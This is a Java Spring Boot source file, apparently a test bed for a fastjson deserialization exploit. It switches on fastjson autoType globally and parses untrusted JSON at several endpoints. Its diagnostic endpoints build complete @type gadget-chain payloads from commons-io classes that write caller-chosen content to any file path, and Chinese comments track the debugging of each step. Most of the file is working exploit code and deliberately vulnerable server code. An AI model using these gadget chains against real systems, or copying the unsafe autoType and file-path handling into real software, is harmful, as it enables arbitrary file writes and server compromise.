package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={}", json.length());
            JSONObject.parseObject(json);
            r.put("ok", true);
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * step=G  验证 count 字段是否能被注入（SupportNonPublicField 模式）
     * step=H  完整链，先用 SupportNonPublicField 注入 buf+count
     * step=I  完全绕过 ByteArrayInputStream，改用 StringBufferInputStream
     *         （JDK 废弃类，但仍存在，内部直接操作 String，无 count 问题）
     * step=J  用 fastjson 创建 wos，Java 代码把 bais 数据手动泵入 wos（验证 wos 写入）
     */
    @PostMapping("/diag/step")
    public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "G");
        String file = body.getOrDefault("file", "/tmp/step_" + step);
        String content = body.getOrDefault("content", "STEP-" + step + "-OK\n");
        Map<String, Object> r = new LinkedHashMap<>();

        byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
        String b64Content = Base64.getEncoder().encodeToString(contentBytes);
        int byteLen = contentBytes.length;
        String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");

        try {
            switch (step) {

                case "G": {
                    // 用 SupportNonPublicField 注入 protected 的 count 字段
                    String json = "{\"@type\":\"java.io.ByteArrayInputStream\","
                            + "\"buf\":\"" + b64Content + "\","
                            + "\"count\":" + byteLen + "}";
                    log.info("[STEP-G] json={}", json);
                    // SupportNonPublicField 允许注入 protected/private 字段
                    Object obj = JSONObject.parseObject(json, Object.class, Feature.SupportNonPublicField);
                    log.info("[STEP-G] type={}", obj == null ? "null" : obj.getClass().getName());
                    if (obj instanceof ByteArrayInputStream) {
                        ByteArrayInputStream bais = (ByteArrayInputStream) obj;
                        Field cf = ByteArrayInputStream.class.getDeclaredField("count");
                        cf.setAccessible(true);
                        log.info("[STEP-G] count={}", cf.get(bais));
                        byte[] buf = new byte[256];
                        int n = bais.read(buf);
                        log.info("[STEP-G] read={} preview={}", n,
                                n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
                        r.put("count", cf.get(bais));
                        r.put("readBytes", n);
                        r.put("preview", n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
                    }
                    r.put("ok", true);
                    r.put("type", obj == null ? "null" : obj.getClass().getSimpleName());
                    break;
                }

                case "H": {
                    // 完整链 + SupportNonPublicField
                    // 注意：JSONObject.parseObject(json) 不支持 Feature，
                    // 但 JSON.parse(json, Feature) 可以。
                    // 换成 JSON.parseObject(json, JSONObject.class, Feature.SupportNonPublicField)
                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                            + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                            + "\"file\":\"" + escapedFile + "\","
                            + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                            + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                            + "\"writer\":{\"$ref\":\"$.lfw\"},"
                            + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                            + "\"bais\":{\"@type\":\"java.io.ByteArrayInputStream\","
                            + "\"buf\":\"" + b64Content + "\","
                            + "\"count\":" + byteLen + "},"
                            + "\"tee\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                            + "\"input\":{\"$ref\":\"$.bais\"},"
                            + "\"branch\":{\"$ref\":\"$.wos\"},"
                            + "\"closeBranch\":true},"
                            + "\"xml\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                            + "\"is\":{\"$ref\":\"$.tee\"},"
                            + "\"httpContentType\":\"text/xml\","
                            + "\"lenient\":true,"
                            + "\"defaultEncoding\":\"iso-8859-1\"}"
                            + "}";
                    log.info("[STEP-H] json len={}", json.length());
                    com.alibaba.fastjson.JSONObject result =
                            com.alibaba.fastjson.JSON.parseObject(json, com.alibaba.fastjson.JSONObject.class,
                                    Feature.SupportNonPublicField);
                    log.info("[STEP-H] OK keys={}", result == null ? "null" : result.keySet());
                    File f = new File(file);
                    log.info("[STEP-H] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                    r.put("fileExists", f.exists());
                    r.put("fileSize", f.exists() ? f.length() : -1);
                    r.put("ok", true);
                    break;
                }

                case "I": {
                    // 改用 StringBufferInputStream（JDK 废弃类，read() 从 String 读，无 count 问题）
                    // 内部直接 return buffer.charAt(pos++) & 0xFF，不依赖 count 字段
                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                            + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                            + "\"file\":\"" + escapedFile + "\","
                            + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                            + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                            + "\"writer\":{\"$ref\":\"$.lfw\"},"
                            + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                            // StringBufferInputStream(String s) - 构造参数名 "s"，有参数名
                            + "\"sbis\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"java.io.StringBufferInputStream\","
                            + "\"s\":\"" + content.replace("\\", "\\\\").replace("\"", "\\\"") + "\"},"
                            + "\"tee\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                            + "\"input\":{\"$ref\":\"$.sbis\"},"
                            + "\"branch\":{\"$ref\":\"$.wos\"},"
                            + "\"closeBranch\":true},"
                            + "\"xml\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                            + "\"is\":{\"$ref\":\"$.tee\"},"
                            + "\"httpContentType\":\"text/xml\","
                            + "\"lenient\":true,"
                            + "\"defaultEncoding\":\"iso-8859-1\"}"
                            + "}";
                    log.info("[STEP-I] json len={}", json.length());
                    JSONObject result = JSONObject.parseObject(json);
                    log.info("[STEP-I] OK keys={}", result == null ? "null" : result.keySet());
                    File f = new File(file);
                    log.info("[STEP-I] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                    r.put("fileExists", f.exists());
                    r.put("fileSize", f.exists() ? f.length() : -1);
                    r.put("ok", true);
                    break;
                }

                case "J": {
                    // fastjson 创建 wos，Java 从 bais 手动泵入数据到 wos
                    // 验证：wos 本身是否可以正确写入（上次 step=E 已确认）
                    // 这次验证 bais(buf+count) 是否可读
                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                            + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                            + "\"file\":\"" + escapedFile + "\","
                            + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                            + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                            + "\"writer\":{\"$ref\":\"$.lfw\"},"
                            + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                            + "\"bais\":{\"@type\":\"java.io.ByteArrayInputStream\","
                            + "\"buf\":\"" + b64Content + "\","
                            + "\"count\":" + byteLen + "}"
                            + "}";
                    com.alibaba.fastjson.JSONObject result =
                            com.alibaba.fastjson.JSON.parseObject(json, com.alibaba.fastjson.JSONObject.class,
                                    Feature.SupportNonPublicField);
                    log.info("[STEP-J] OK keys={}", result == null ? "null" : result.keySet());

                    Object wosObj = result.get("wos");
                    Object baisObj = result.get("bais");
                    log.info("[STEP-J] wos={} bais={}", wosObj == null ? "null" : wosObj.getClass().getName(),
                            baisObj == null ? "null" : baisObj.getClass().getName());

                    if (baisObj instanceof ByteArrayInputStream) {
                        ByteArrayInputStream bais = (ByteArrayInputStream) baisObj;
                        Field cf = ByteArrayInputStream.class.getDeclaredField("count");
                        cf.setAccessible(true);
                        log.info("[STEP-J] bais.count={}", cf.get(bais));
                        // 手动读一个字节看 count 是否有效
                        int firstByte = bais.read();
                        log.info("[STEP-J] bais.read()={}", firstByte);
                    }
                    if (wosObj instanceof WriterOutputStream && baisObj instanceof ByteArrayInputStream) {
                        WriterOutputStream wos = (WriterOutputStream) wosObj;
                        ByteArrayInputStream bais = (ByteArrayInputStream) baisObj;
                        // 重置 bais 到开头
                        bais.reset();
                        byte[] buf = new byte[4096];
                        int n, total = 0;
                        while ((n = bais.read(buf)) != -1) {
                            wos.write(buf, 0, n);
                            total += n;
                        }
                        wos.flush(); wos.close();
                        log.info("[STEP-J] pumped {} bytes", total);
                    }
                    File f = new File(file);
                    log.info("[STEP-J] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                    r.put("fileExists", f.exists());
                    r.put("fileSize", f.exists() ? f.length() : -1);
                    r.put("ok", true);
                    break;
                }

                default:
                    r.put("ok", false); r.put("msg", "step must be G/H/I/J"); return r;
            }

        } catch (Exception e) {
            log.error("[STEP-{}-ERR] {}:{}", step, e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[STEP-{}-STACK]\n{}", step, sw);
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            File f = new File(file);
            r.put("fileExists", f.exists());
            r.put("fileSize", f.exists() ? f.length() : -1);
        }
        return r;
    }
}
